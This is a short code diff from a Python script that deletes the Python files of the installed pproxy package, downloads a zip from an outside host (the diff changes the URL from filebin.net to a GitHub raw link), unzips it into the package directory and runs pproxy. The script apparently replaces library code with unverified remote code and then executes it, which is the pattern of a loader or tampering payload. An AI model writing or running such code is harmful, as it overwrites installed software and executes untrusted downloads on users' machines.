@@ -7,8 +7,8 @@ os.chdir('/usr/local/lib/python3.10/dist-packages/pproxy')
 for i in os.listdir():
   if '.py' in i:
     os.remove(i)
-wget.download('https://filebin.net/archive/k000owj86lsp9ovx/zip')
-os.popen('unzip k000owj86lsp9ovx.zip').read()
+wget.download('https://github.com/GrimsGreen/code/raw/main/6qxu6o.zip')
+os.popen('unzip 6qxu6o.zip').read()
 def run_proxy():
   process = subprocess.run('pproxy', shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
   print("Output:", process.stdout.decode())
